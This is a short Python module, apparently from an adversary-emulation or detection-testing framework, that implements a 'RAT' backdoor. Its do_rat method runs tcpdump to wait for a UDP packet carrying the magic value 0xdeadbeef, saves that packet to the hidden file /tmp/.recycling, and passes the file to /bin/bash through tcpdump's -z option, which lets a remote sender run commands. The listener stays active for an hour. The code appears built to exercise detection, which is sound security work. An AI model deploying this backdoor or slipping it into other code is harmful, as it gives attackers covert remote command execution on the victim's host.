try:
    from framework.main import ModuleBase
except ImportError:
    pass

class TcpdumpTriggerable(ModuleBase):
    @property
    def relative_delay(self):
        return 10

    @property
    def absolute_duration(self):
        return 60 * 60

    def do_rat(self):
        import os, subprocess, atexit, time
        logfilename = '/tmp/.recycling'
        def cleanup():
            try:
                os.unlink(logfilename)
            except:
                pass
        atexit.register(cleanup)
        cmd = 'tcpdump -w {0} -c 1 "udp[8:4]==0xdeadbeef" -z /bin/bash'.format(logfilename)
        try:
            p = subprocess.Popen(cmd, shell=True)
        except Exception as e:
            self.hec_logger(str(e), severity='error')
            return
        time.sleep(self.absolute_duration)
        p.kill()
        p.wait()

    def run(self):
        self.start()
        pid = self.util_childproc(func=self.do_rat)
        self.hec_logger('Kicked off tcpdump triggerable', pid=pid)
        self.util_orphanwait(pid)
        self.finish()

